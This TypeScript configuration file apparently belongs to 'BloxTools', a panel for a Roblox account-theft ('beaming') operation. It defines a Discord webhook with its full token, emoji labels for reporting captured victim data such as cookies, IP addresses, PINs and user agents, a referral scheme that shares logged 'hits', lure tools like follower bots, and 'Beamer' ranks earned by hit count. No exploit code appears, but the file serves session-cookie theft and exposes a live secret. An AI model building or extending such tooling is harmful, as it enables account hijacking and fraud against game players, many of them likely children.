export const siteConfig = {
  name: "BloxTools",
  webhookUrl: "https://discord.com/api/webhooks/1499103473546035462/pSKamRGzu27_7p4kr2Spr5YZl7zylwmRuj4omBg02R3jVq6XbCCpbYl6gh4G6KkAv95z",
  discordInviteUrl: "https://discord.gg/your-invite-here",
};

// Referral signup heads-up notice. {username} will be replaced with the referrer.
// Edit the message here. The styling uses the active theme — no hard-coded colors.
export const referralNotice = {
  // Title shown above the message
  title: "Heads up",
  // {username} placeholder — referrer's username (without the @)
  message:
    "You're signing up using @{username}'s referral link. They'll be able to see hits you log on your own site (this does not affect your stats).",
};

// Lovable usernames whose leaderboard row should always render with the
// animated golden gradient name. Lowercase. Add or remove freely — the
// database trigger reads this list via the `is_golden` flag, but for
// clarity the canonical list lives here too.
export const GOLDEN_USERNAMES: string[] = [
  "cheeky",
];

// NOTE: Discord emoji overrides used to live here. They now live as the
// `DISCORD_EMOJIS` secret on the edge function so updating them does NOT
// require a code change. The kept export below is purely informational so
// you can see the default key set the edge function uses.
export const discordEmojis = {
  robux:    "<:7116_Robux:1498757858731360349>",
  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
  rap:      "💎",
  summary:  "📊",
  pending:  "⏳",
  voice:    "🎤",
  age:      "🪪",
  korblox:  "<:KorbloxDeathspeaker:1498762534784864387>",
  headless: "<:noFilter:1498762549762461909>",
  groups:   "👑",
  games:    "🎮",
  cookie:   "🍪",
  ip:       "🌐",
  user:     "👤",
  id:       "🆔",
  age_acct: "📅",
  friends:  "🫂",
  followers:"👥",
  following:"➡️",
  ua:       "🖥️",
  time:     "⏰",
  pin:      "🔐",
  owner:    "🏷️",
};

// Stock tutorial videos shown when a user picks "stock" video preference.
// Replace REPLACE_ME with real YouTube IDs as you record/pick them.
export const toolsConfig = {
  botFollowers: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  copyGames: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  copyClothes: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  groupBotter: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  vcEnabler: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
};

// Rank tiers (linear progression). Index 0 = lowest rank.
export const RANKS: { name: string; min: number }[] = [
  { name: "Beginner Beamer", min: 0 },
  { name: "Low Beamer", min: 10 },
  { name: "Novice Beamer", min: 25 },
  { name: "Average Beamer", min: 50 },
  { name: "Decent Beamer", min: 100 },
  { name: "Solid Beamer", min: 200 },
  { name: "Good Beamer", min: 350 },
  { name: "Advanced Beamer", min: 550 },
  { name: "Pro Beamer", min: 800 },
  { name: "Top Beamer", min: 1200 },
];

export function getRank(hits: number) {
  let current = RANKS[0];
  let next: { name: string; min: number } | null = null;
  for (let i = 0; i < RANKS.length; i++) {
    if (hits >= RANKS[i].min) {
      current = RANKS[i];
      next = RANKS[i + 1] ?? null;
    }
  }
  return { current, next };
}
